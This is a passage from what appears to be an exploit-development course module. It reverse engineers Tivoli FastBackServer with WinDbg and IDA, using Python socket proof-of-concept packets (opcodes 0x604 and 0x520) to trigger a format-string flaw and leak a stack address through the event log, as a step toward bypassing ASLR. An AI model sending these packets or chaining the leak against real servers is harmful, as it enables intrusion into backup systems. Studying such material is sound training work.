	buf += pack("<i", 0x0)    # 1st memcpy: offset
	buf += pack("<i", 0x100)  # 1st memcpy: size field
	buf += pack("<i", 0x100)  # 2nd memcpy: offset
	buf += pack("<i", 0x100)  # 2nd memcpy: size field
	buf += pack("<i", 0x200)  # 3rd memcpy: offset
	buf += pack("<i", 0x100)  # 3rd memcpy: size field
	buf += bytearray([0x41]*0x8)

	# psCommandBuffer
	buf += b"A" * 0x100  
	buf += b"B" * 0x100 
	buf += b"C" * 0x100 

  # Padding
	buf += bytearray([0x41]*(0x404-len(buf)))

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))
	
	s.send(buf)
	s.close()

	print("[+] Packet sent")
	sys.exit(0)


if __name__ == "__main__":
 	main()
Listing 16 - Initial proof of concept for opcode 0x604
To test it, let's set a breakpoint on the comparison of the opcode found at the address 0x56cdf5 in FastBackserver and send the packet.
0:080> bp 56cdf5

0:080> g
Breakpoint 0 hit
eax=060fc8f0 ebx=060fae50 ecx=00000604 edx=00000001 esi=060fae50 edi=00669360
eip=0056cdf5 esp=0d55e334 ebp=0d5bfe98 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
FastBackServer!FXCLI_OraBR_Exec_Command+0x93f:
0056cdf5 81bdd0e4f9ff04060000 cmp dword ptr [ebp-61B30h],604h ss:0023:0d55e368=00000604
Listing 17 - Breakpoint on opcode 0x604 comparison
Listing 17 shows that our initial proof of concept will trigger the correct opcode path.
Now we can continue execution until the call into AGI_S_GetAgentSignature. If we dump the first three arguments, we find that they contain the three parts of our psCommandBuffer buffer.
eax=0d5ad980 ebx=060fae50 ecx=0d5b9cf0 edx=0d5b3b30 esi=060fae50 edi=00669360
eip=0056df5c esp=0d55e324 ebp=0d5bfe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x1aa6:
0056df5c e862d6fdff      call    FastBackServer!AGI_S_GetAgentSignature (0054b5c3

0:006> dd poi(esp) L4
0d5b3b30  41414141 41414141 41414141 41414141

0:006> dd poi(esp+4) L4
0d5b9cf0  42424242 42424242 42424242 42424242

0:006> dd poi(esp+8) L4
0d5ad980  43434343 43434343 43434343 43434343
Listing 18 - Arguments to AGI_S_GetAgentSignature
We're off to a great start since we have absolute control of three arguments to the function.
We'll step into the function and find that, by default, we follow the code path that lets us reach the call into _EventLog with the format string containing a string format specifier:
eax=0d5b3b30 ebx=060fae50 ecx=02a4d738 edx=00976a78 esi=060fae50 edi=00669360
eip=0054b69b esp=0d55e2dc ebp=0d55e31c iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
FastBackServer!AGI_S_GetAgentSignature+0xd8:
0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431)

0:006> dds esp L4
0d55e2dc  00000008
0d55e2e0  00000019
0d55e2e4  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520
0d55e2e8  0d5b3b30

0:006> da 008118a4 
008118a4  "AGI_S_GetAgentSignature: couldn'"
008118c4  "t find agent %s."

0:006> dd 0d5b3b30
0d5b3b30  41414141 41414141 41414141 41414141
...
Listing 19 - Arguments to _EventLog
When we step into _EventLog, we once again find that by default, execution takes us to the call to _ml_vsnprintf.
Before calling _ml_vsnprintf, let's dump the arguments from the stack to verify that our input is used.
eax=008118a4 ebx=060fae50 ecx=0d55ded4 edx=0d55e2e8 esi=060fae50 edi=00669360
eip=0048048f esp=0d55dea8 ebp=0d55e2d4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog+0x5e:
0048048f e89fac1d00      call    FastBackServer!ml_vsnprintf (0065b133)

0:006> dds esp L4
0d55dea8  0d55ded4
0d55deac  00000400
0d55deb0  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520
0d55deb4  0d55e2e8

0:006> da 008118a4 
008118a4  "AGI_S_GetAgentSignature: couldn'"
008118c4  "t find agent %s."

0:006> dd poi(poi(esp+c)) L4
0d5b3b30  41414141 41414141 41414141 41414141
Listing 20 - Arguments to ml_vsnprintf
Listing 20 displays the first argument as the destination buffer and the third argument as the format string.
The fourth argument, according to the function prototype, is an array containing the arguments. Since there is only one format string specifier present, an array containing one element is used.
Since the format specifier used in the format string is "%s", the argument is interpreted as a pointer to a character array. We can verify the contents of the argument through a double dereference, as shown at the bottom of the listing.
We expect that ml_vsnprintf will insert the A's into the format string. Let's verify this by stepping over the call and dumping the contents of the destination buffer.
0:006> p
eax=0000012e ebx=060fae50 ecx=0d55de68 edx=0d55e001 esi=060fae50 edi=00669360
eip=00480494 esp=0d55dea8 ebp=0d55e2d4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog+0x63:
00480494 83c410          add     esp,10h

0:006> da 0d55ded4
0d55ded4  "AGI_S_GetAgentSignature: couldn'"
0d55def4  "t find agent AAAAAAAAAAAAAAAAAAA"
0d55df14  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d55df34  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d55df54  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d55df74  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d55df94  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d55dfb4  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d55dfd4  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d55dff4  "AAAAAAAAAAAAA."
Listing 21 - Formatted string after call to vsnprintf
As expected, we find that our input buffer has been inserted into the format string as A's.
We have now achieved part of our goal. We found a way to reach the call to _ml_vsnprintf from a network packet, but the formatted string shown in Listing 21 is not of much use, since it only contains A's.
Next, we'll modify our proof of concept to send a network packet that contains the "%x" format specifier instead of A's, as shown in Listing 22.
...
# psCommandBuffer
buf += b"%x" * 0x80  
buf += b"B" * 0x100 
buf += b"C" * 0x100 
...
Listing 22 - Replace A's with %x's in the network packet
Ideally, we would set a breakpoint on the call to ml_vsnprintf inside _EventLog, but it is called by so many other functions that it is impossible to trigger it correctly.
Instead, we'll set a breakpoint in AGI_S_GetAgentSignature on the call into _EventLog, then single step until we reach the call to ml_vsnprintf.
0:006> bc *

0:006> bp FastBackServer!AGI_S_GetAgentSignature+0xd8

0:006> g
Breakpoint 0 hit
eax=0d9b3b30 ebx=060fae50 ecx=02a4d738 edx=00976a78 esi=060fae50 edi=00669360
eip=0054b69b esp=0d95e2dc ebp=0d95e31c iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
FastBackServer!AGI_S_GetAgentSignature+0xd8:
0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431)

0:006> t
...
eax=008118a4 ebx=060fae50 ecx=0d95ded4 edx=0d95e2e8 esi=060fae50 edi=00669360
eip=0048048f esp=0d95dea8 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog+0x5e:
0048048f e89fac1d00      call    FastBackServer!ml_vsnprintf (0065b133)

0:006> dds esp L4
0d95dea8  0d95ded4
0d95deac  00000400
0d95deb0  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520
0d95deb4  0d95e2e8

0:006> da poi(poi(esp+c))
0d9b3b30  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
0d9b3b50  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
0d9b3b70  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
0d9b3b90  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
0d9b3bb0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
0d9b3bd0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
0d9b3bf0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
0d9b3c10  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
0d9b3c30  ""
Listing 23 - 0x80 %x format specifiers
We'll note from the last output of Listing 23 that the argument string to vsnprintf consists of 128 (0x80) hexadecimal format string specifiers.
In Listing 24, we'll step over the call to the format string function and find that the formatted string now contains several hexadecimal format string specifiers.
0:006> p
eax=0000012e ebx=060fae50 ecx=0d95de68 edx=0d95e001 esi=060fae50 edi=00669360
eip=00480494 esp=0d95dea8 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog+0x63:
00480494 83c410          add     esp,10h

0:006> da 0d95ded4
0d95ded4  "AGI_S_GetAgentSignature: couldn'"
0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%"
0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df94  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95dfb4  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95dfd4  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95dff4  "x%x%x%x%x%x%x."
Listing 24 - Hex specifiers are inserted into the string
We obtained our first tangible indication that we can perform a format string specifier attack.
Now we can craft a format string with almost-arbitrary format string specifiers. Our only limitation comes from the number of bytes written by vsnprintf, which is hardcoded to 0x400 through its second argument.
In the next section, we'll develop a better understanding of how the EventLog_wrapted function uses the generated format string.
Exercises
1.	Follow the analysis and create a proof of concept that triggers the correct opcode and executes _EventLog.
2.	Modify the proof of concept to obtain a formatted string containing format string specifiers.
3.	Is it possible to use different format string specifiers like "%s"? What what happens if we let execution continue afterwards?
1 (Hex-Rays, 2020), https://github.com/idapython/src
2 (Google, 2013), https://code.google.com/archive/p/idapathfinder/
11.2.3. Invoke the Specifiers
In this section, we will continue our analysis and dig into EventLog_wrapted to uncover if (and how) our formatted string is used.
Let's start with the formatted string following the call to ml_vsnprintf. Figure 8 shows the interesting code following the call.
 
Figure 8: Detecting length of format string
We'll notice three highlighted items above. First, the formatted string is stored at the offset "Str" from EBP. Second, the static value 0xC4 is stored in the offset var_41C from EBP.
The last highlighted code section calls the _ml_strbytelen function, which is a wrapper for an embedded version of strlen.1 The call's purpose is to determine the length of the formatted string. The result is stored at offset var_40C from EBP.
To find the length of the format string, we'll single step to the call into _ml_strbytelen and step over it:
eax=0d95ded4 ebx=060fae50 ecx=0d95de68 edx=0d95ded4 esi=060fae50 edi=00669360
eip=004804cc esp=0d95deb4 ebp=0d95e2d4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
FastBackServer!EventLog+0x9b:
004804cc e8aaaa1d00      call    FastBackServer!ml_strbytelen (0065af7b)

0:006> p
eax=0000012e ebx=060fae50 ecx=0d95ded4 edx=7eff0977 esi=060fae50 edi=00669360
eip=004804d1 esp=0d95deb4 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog+0xa0:
004804d1 83c404          add     esp,4
Listing 25 - Length of format string
The length was found to be 0x12E. Next, the application stores it and moves execution to the basic block shown in Figure 9.
 
Figure 9: Format string size comparison
The comparison is between the length of the formatted string and the static value 0xC4. Our format string is longer, so the jump is not taken, leading us to a basic block that performs several modifications to our format string before calling EventLog_wrapted.
To understand what changes happen to the formatted string, we can single step to the call and inspect the arguments:
eax=00000019 ebx=060fae50 ecx=00000008 edx=0d95ded4 esi=060fae50 edi=00669360
eip=00480568 esp=0d95deac ebp=0d95e2d4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!EventLog+0x137:
00480568 e8b0fbffff      call    FastBackServer!EventLog_wrapted (0048011d)

0:006> dds esp L3
0d95deac  00000008
0d95deb0  00000019
0d95deb4  0d95ded4

0:006> da poi(esp+8)
0d95ded4  "AGI_S_GetAgentSignature: couldn'"
0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%"
0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df94  "x%x%.."
Listing 26 - Arguments for EventLog_wrapted
We'll observe that the formatted string has been shortened, but is otherwise unchanged.
Stepping into EventLog_wrapted, we'll find some initial checks followed by a large basic block that performs several string modifications. These are all outside of our influence, so we can ignore them.
At the end of the function, we encounter a basic block that calls _ml_vsnprintf once again, as displayed in Figure 10.
 
Figure 10: Second call to ml_vsnprinf
To analyze the arguments for _ml_vsnprintf, let's single step to the call and display them.
eax=0000002d ebx=060fae50 ecx=0d95dca5 edx=000001c7 esi=060fae50 edi=00669360
eip=004803fa esp=0d95dc14 ebp=0d95dea4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
FastBackServer!EventLog_wrapted+0x2dd:
004803fa e834ad1d00      call    FastBackServer!ml_vsnprintf (0065b133)

0:006> dds esp L4
0d95dc14  0d95dca5
0d95dc18  000001c7
0d95dc1c  0d95ded4
0d95dc20  0d95deb8

0:006> da poi(esp+8)
0d95ded4  "AGI_S_GetAgentSignature: couldn'"
0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%"
0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
0d95df94  "x%x%.."
Listing 27 - Arguments for second vsnprintf
The formatted string from the first call to _ml_vsnprintf is indeed used as a format string. Additionally, the stack pointer present at offset 0xC from ESP will be interpreted as a pointer to an array of arguments. It is also worth noting that the result of _ml_vsnprintf is stored at the offset label Str.
Stepping over the call will copy the contents of the arguments array into the format string and format it as hexadecimal values. Because we did not supply any arguments, vsnprintf will use any values present at that given address.
The result of this formatting is given in Listing 28.
0:006> p
eax=ffffffff ebx=060fae50 ecx=0d95dbd4 edx=00000200 esi=060fae50 edi=00669360
eip=004803ff esp=0d95dc14 ebp=0d95dea4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog_wrapted+0x2e2:
004803ff 83c410          add     esp,10h

0:006> da 0d95dca5
0d95dca5  "AGI_S_GetAgentSignature: couldn'"
0d95dcc5  "t find agent c4d95ded4782512e780"
0d95dce5  "5f49474165475f53656741746953746e"
0d95dd05  "74616e673a657275756f6320276e646c"
0d95dd25  "696620746120646e746e656725782520"
0d95dd45  "25782578257825782578257825782578"
0d95dd65  "25782578257825782578257825782578"
0d95dd85  "25782578257825782578257825782578"
0d95dda5  "25782578257825782578257825782578"
0d95ddc5  "25782578257825782578257825782578"
0d95dde5  "25782578257825782578257825782578"
0d95de05  "25782578257825782578257825782578"

0:006> !teb
TEB at 00205000
    ExceptionList:        0d9bff38
    StackBase:            0d9c0000
    StackLimit:           0d95d000
    SubSystemTib:         00000000
    FiberData:            00001e00
Listing 28 - Leak of stack address
As highlighted in Listing 28, we find an address (0xd95ded4) at the beginning of the formatted hexadecimal values.
Checking the stack limits, we can verify this address is within the limits and we have managed to leak a stack pointer.
When developing an exploit, it is important to execute it multiple times to ensure the consistency of the stack address.
While valid, this type of ASLR bypass is not immediately useful since the leak happens on the server, and we have no known way of obtaining the stack address after it is leaked.
In the next sections, we'll learn more about what happens with the leaked stack address following the second vsnprintf call, and determine if we can retrieve it from our Kali machine.
Exercise
1.	Trace execution to the second vsnprintf call and verify that the custom format string leads to a stack leak.
1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstring/strlen/
11.3. Reading the Event Log
We know from the previous section that FastBackServer contains at least one format string function that can be abused to leak a stack address.
After a stack address has been leaked inside the application, we need to find a way to retrieve it. In the next two sections, we will reverse engineer parts of a custom event log for Tivoli that will allow us to do just this.
11.3.1. The Tivoli Event Log
We'll need to develop an attack to return the leaked stack address to our Kali machine. To begin, let's investigate the formatted string containing our leak to determine its intended use.
Figure 11 shows the last part of the basic block right after the second call to _ml_vsnprintf.
 
Figure 11: Call to function _SFILE_Printf
We recall that the formatted string containing our leak is stored at the offset label Str. It is passed as an argument to the _SFILE_Printf function.
The function also takes two other strings as arguments: a format string specifier ("%s"), and a static string. Let's single-step to the call in WinDbg and dump the contents of the static string.
eax=0d95dc78 ebx=060fae50 ecx=0d95dc78 edx=7efeff2c esi=060fae50 edi=00669360
eip=00480425 esp=0d95dc18 ebp=0d95dea4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog_wrapted+0x308:
00480425 e86b9b0100      call    FastBackServer!SFILE_Printf (00499f95)

0:006> dds esp L3
0d95dc18  00a99f40 FastBackServer!EventLOG_sSFILE
0d95dc1c  0078a8b4 FastBackServer!EVENT_LOG_szModuleNames+0x718
0d95dc20  0d95dc78

0:006> da poi(esp)
00a99f40  "C:/ProgramData/Tivoli/TSM/FastBa"
00a99f60  "ck/server/FAST_BACK_SERVER"
Listing 29 - Arguments for SFILE_Printf
It seems that the first argument is a file path or folder. We can try to learn more about it by performing a directory listing of C:\ProgramData\Tivoli\TSM\FastBack\server, as shown in Listing 30.
C:\Tools> dir C:\ProgramData\Tivoli\TSM\FastBack\server
 Volume in drive C has no label.
 Volume Serial Number is 4097-9145

 Directory of C:\ProgramData\Tivoli\TSM\FastBack\server

27/04/2020  16.30    <DIR>          .
27/04/2020  16.30    <DIR>          ..
27/04/2020  16.30           435.203 clog010.sf
08/02/2020  21.52               228 conf.txt
27/04/2020  16.30               174 conf.txt.sig
08/02/2020  21.52               228 conf.txt.tmp
25/04/2020  15.05               614 DebugDumpCreate.txt
25/11/2019  21.54    <DIR>          FastBackBMR
26/04/2020  19.21         2.560.003 FAST_BACK_SERVER030.sf
26/04/2020  20.25         2.560.003 FAST_BACK_SERVER031.sf
27/04/2020  08.35         2.560.003 FAST_BACK_SERVER032.sf
27/04/2020  09.39         2.560.003 FAST_BACK_SERVER033.sf
27/04/2020  10.44         2.560.003 FAST_BACK_SERVER034.sf
27/04/2020  11.48         2.560.003 FAST_BACK_SERVER035.sf
27/04/2020  12.52         2.560.003 FAST_BACK_SERVER036.sf
27/04/2020  13.57         2.560.003 FAST_BACK_SERVER037.sf
27/04/2020  15.01         2.560.003 FAST_BACK_SERVER038.sf
27/04/2020  16.06         2.560.003 FAST_BACK_SERVER039.sf
27/04/2020  22.13           622.851 FAST_BACK_SERVER040.sf
...
Listing 30 - Multiple files with custom names
Listing the directory reveals multiple files that match the argument from _SFILE_Printf, as well as a suffix and the .sf extension.
The number of files with the name varies depending on the length of time FastBackServer has been installed on the system.
This gives us the suspicion that the contents of our format string may be written to one of these files. If we inspect the last file, we discover a massive amount of logged information:
C:\Tools> more C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf
∩╗┐[Apr 27 16:06:06:960]( ebc)->I4.MGR          :       CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is status                                                                                             
[Apr 27 16:06:07:475]( ebc)->I4.MGR             :       CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is status                                                                                             
[Apr 27 16:06:07:991]( ebc)->I4.MGR             :       CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is status                                                                                             
[Apr 27 16:06:08:069]( b94)->I4.FSI             :       REP_FSI_S_GetFullPath: File [{}dummy.txt] use size [0]  
...
Listing 31 - Contents of FAST_BACK_SERVER040.sf
We can create a hypothesis that Tivoli maintains a custom event log and the purpose of the _EventLog function is to write events to it. This means that our formatted string containing a stack leak should also be written to it.
To test this hypothesis, we can navigate into _SFILE_Printf with IDA Pro. At the beginning of the function, we locate multiple basic blocks that call the _ml_open function, as shown in Figure 12.
 
Figure 12: Call to function ml_open
If we dig into _ml_open, we find it is a wrapper function for wopen1 (Figure 13), which is used to open a file and obtain a handle to it.
 
Figure 13: ml_open is a wrapper for wopen
To obtain the filename, we can single step in WinDbg until we reach the call to _ml_open and dump the arguments.
eax=00000040 ebx=060fae50 ecx=0d95d14c edx=0d95da08 esi=060fae50 edi=00669360
eip=0049a13b esp=0d95d1a0 ebp=0d95dc10 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!SFILE_Printf+0x1a6:
0049a13b e82a081c00      call    FastBackServer!ml_open (0065a96a)

0:006> dds esp L3
0d95d1a0  0d95da08
0d95d1a4  00000102
0d95d1a8  00000180

0:006> da poi(esp)
0d95da08  "C:/ProgramData/Tivoli/TSM/FastBa"
0d95da28  "ck/server/FAST_BACK_SERVER040.sf"
0d95da48  ""
Listing 32 - Arguments to ml_open
We'll note the full name of the custom event log file as C:/ProgramData/Tivoli/TSM/FastBack/server/FAST_BACK_SERVER040.sf, which is supplied to _ml_open.
When a function opens a file, it will typically either read from it or write to it. While SFILE_Printf is a large function, a quick browse in IDA Pro reveals several basic blocks with calls to _fwrite,2 which is typically used to write data to a file.
An example of one of these basic blocks is shown in Figure 14.
 
Figure 14: One of the calls to fwrite inside SFILE_Printf
Instead of analyzing the rest of _SFILE_Printf, let's attempt to speed up our analysis by letting it execute to the end.
Once the function is complete, we'll open a PowerShell prompt and list the last entry in the custom event log. We can list this entry by using the Get-Content cmdlet3 with the -Tail option and a value of "1".
PS C:\Tools> Get-Content C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 1
[Apr 28 00:21:55:849](1910)-->W8.AGI            :       AGI_S_GetAgentSignature: couldn't find agent c4d95ded4782512e7805f49474165475f53656741746953746e74616e673a657275756f6320276e646c696620746120646e746e65672578252025782578257825782578257825782578257825782578257825
Listing 33 - Formatted string as an event entry
We confirm that this is our formatted string and that it still contains the leaked stack address. This proves that our hypothesis was correct!
In this section, we discovered that the Tivoli application maintains a custom event log, and confirmed that our formatted string containing a leaked stack address is written to it. Next, we need to find a way to obtain content from the custom event log remotely.
Exercise
1.	Follow the analysis to uncover the custom event log and locate the stack leak written to it.
1 (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/open-wopen?view=msvc-160
2 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fwrite/
3 (Microsoft, 2020), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-7
11.3.2. Remote Event Log Service
In the previous section, we found that when _EventLog is called, the supplied string is formatted and subsequently written to the custom event log. We leveraged this by sending a network packet and forced a stack address to be written to the event log.
To move forward with this exploit and bypass ASLR, we need to retrieve contents from the custom event log by sending another network packet. We will uncover a way to access the event log remotely in this and the following sections.
So far, the vulnerability we used has only triggered a write to the event log. There is no way to directly retrieve the log because it is stored locally on the server. Instead, we will need to locate a different code path to access the event log.
To start, let's remember that when _SFILE_Printf is called, a global variable containing a part of the log file name is supplied as an argument. This is also shown in Figure 15.
 
Figure 15: Global variable with event log file name
Logically, it makes sense that if an application maintains a custom event log, it also contains a function to read the log.
Since this event log is likely shared across all processes related to Tivoli and not just used by FastBackServer, we are not guaranteed that it will contain a function to read it. If FastBackServer does contain this functionality, it stands to reason that the same global variable would be used.
To find out if this functionality exists, let's perform a cross-reference from EventLOG_sSFILE. We find five usages, as displayed in Figure 16.
 
Figure 16: Cross references to the global variable
We'll notice that based on the function names, there are only two locations that do not seem directy related to the event log. Both usages are in FXCLI_OraBR_Exec_Command, which might allow us to reach them.
If we start by jumping to the address of the cross reference at the bottom, we'll find the basic block given in Figure 17.
 
Figure 17: Erase event log option?
It seems that the code path leading to this basic block deletes the content of the custom event log. This may indicate a security weakness, since an unauthenticated user can delete the event log, but this is not useful for us at the moment. Let's inspect the other cross-reference instead.
The other cross-reference leads us to a few basic blocks that perform a series of checks, after which they reach the code shown in Figure 18.
 
Figure 18: Call to _SFILE_ReadBlock
The function name _SFILE_ReadBlock sounds promising. Entering into the function, we find additional checks, and further down we notice a call to fread1 (Figure 19), which is used to read from a file.
 
Figure 19: Call to fread inside _SFILE_ReadBlock
Given the presence of the fread call and usage of the custom event log file path, it seems as though the _SFILE_ReadBlock function may read from the event log.
Next, we need to find the opcode that will allow us to create a proof of concept and trigger this function.
Locating the opcode is not particularly straightforward, so we'll need to perform some analysis. First, we will go back to where the global variable containing the file path was used. From this location, we can follow the code backward to find an important basic block, as shown in Figure 20.
 
Figure 20: Basic block one backwards from desired code path
We'll observe two interesting things about the basic block.
First, when we followed execution backwards, it was from the code path that is taken when the JNZ shown in Figure 20 is not taken. This means that the variable used in the comparison must contain the value "1".
Since the address at offset var_5575C is used as an output buffer for sccanf and in the subsequent comparison, we'll need to provide a correct format string to it.
Second, the comment in the first line of the basic block reveals that the current basic block is reached from a switch statement as case number 8.
We can backtrack one basic block to locate the assembly code, as given in Figure 21.
 
Figure 21: Switch statement
Let's examine how this jump table works. First, the switch value is moved into ECX and EAX is set to zero through the xor instruction.
Next, the global variable byte_575F6E acts as an array that we index into based on the switch value in ECX. The byte at the requested index is moved into AL.
The retrieved value in AL is next used as an index in the off_575F06 array, followed by the JMP instruction to transfer execution.
From the auto-analysis performed by IDA Pro, we already know that we need a switch value of 8 to reach the correct code path.
We can now move backward one more basic block in search of the opcode value. We'll find the basic block shown in Figure 22. In this basic block, we'll notice the opcode value is being moved from EBP+var_61B30 into EDX, after which 0x518 is subtracted from it.
 
Figure 22: 0x518 subtracted from opcode value
This means we need to supply an opcode of 0x520 to trigger the event log file read code path.
0:006> ? 0x520- 0x518
Evaluate expression: 8 = 00000008
Listing 34 - Calculation for opcode value
We are now ready to create the code needed to trigger the correct opcode and supplement our static analysis with some dynamic analysis. The code required to trigger opcode 0x520 is a repeat of the basic framework we have used before.
Listing 35 shows the relevant psAgentCommand and psCommandBuffer buffers.
...
# psAgentCommand
buf = pack(">i", 0x400)
buf += bytearray([0x41]*0xC)
buf += pack("<i", 0x520)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += b"A" * 0x100  
buf += b"B" * 0x100 
buf += b"C" * 0x100 

# Padding
buf += bytearray([0x41]*(0x404-len(buf)))
...
Listing 35 - Proof of concept to trigger opcode 0x520
To verify that this is the correct opcode, we can set a breakpoint on the basic block that performs the call to sscanf. Referencing this in IDA Pro yields the address 0x570E30 in FastBackServer.
When the breakpoint is set, we can execute the proof of concept and send the network packet.
0:001> bc *

0:001> bp 570e30

0:001> g
Breakpoint 0 hit
eax=00000002 ebx=060fae50 ecx=00000008 edx=00000008 esi=060fae50 edi=00669360
eip=00570e30 esp=0da5e334 ebp=0dabfe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x497a:
00570e30 8d959ca8faff    lea     edx,[ebp-55764h]
Listing 36 - Hitting the breakpoint with opcode 0x520
The breakpoint triggers, showing that we have successfully navigated into the right code path.
Now that we can gain execution on the correct code path, we must reach the call to _SFILE_ReadBlock. Our next challenge to solve is the call to sscanf, repeated in Figure 23.
 
Figure 23: Call to sscanf and subsequent comparison
We'll recall that the JNZ must not be taken to reach the basic block that calls _SFILE_ReadBlock. This means that the value at EBP+var_5575C must be equal to "1".
To understand how we can achieve this, let's reexamine the function prototype of sscanf.
int sscanf ( const char * s, const char * format, ...);
Listing 37 - Function prototype of sscanf
The first argument is the input string that must be processed. The second argument is the format string, and any subsequent arguments are used to store the associated values from the input string.
Let's single step to the call into sscanf to figure out where the input string comes from.
eax=0da6a738 ebx=060fae50 ecx=0da6a73c edx=0dab3b30 esi=060fae50 edi=00669360
eip=00570e51 esp=0da5e320 ebp=0dabfe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x499b:
00570e51 e8cf660f00      call    FastBackServer!sscanf (00667525)

0:001> dd poi(esp) L4
0dab3b30  41414141 41414141 41414141 41414141

0:001> da poi(esp+4)
00858598  "FileType: %d ,Start: %d, Length:"
008585b8  " %d"
Listing 38 - Arguments for sscanf
From here, the input string is the first part of the psCommandBuffer that is used with the sscanf call.
